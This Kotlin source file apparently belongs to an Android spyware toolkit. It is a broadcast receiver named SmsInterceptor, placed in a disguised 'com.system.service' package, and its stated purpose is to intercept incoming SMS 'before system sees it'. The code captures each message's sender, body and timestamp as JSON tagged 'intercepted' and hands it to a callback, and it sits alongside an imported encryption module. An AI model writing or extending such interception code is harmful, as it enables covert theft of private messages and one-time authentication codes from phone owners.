// [context: Kotlin, Android API 26+, intercept incoming SMS before system sees it]
package com.system.service.modules.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.system.service.crypto.DataEncryptor
import org.json.JSONArray
import org.json.JSONObject

class SmsInterceptor : BroadcastReceiver() {

    var onIntercept: ((JSONObject) -> Unit)? = null

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return

        for (msg in messages) {
            val obj = JSONObject().apply {
                put("from", msg.originatingAddress)
                put("body", msg.messageBody)
                put("ts", msg.timestampMillis)
                put("type", "intercepted")
            }
            onIntercept?.invoke(obj)
        }
    }
}
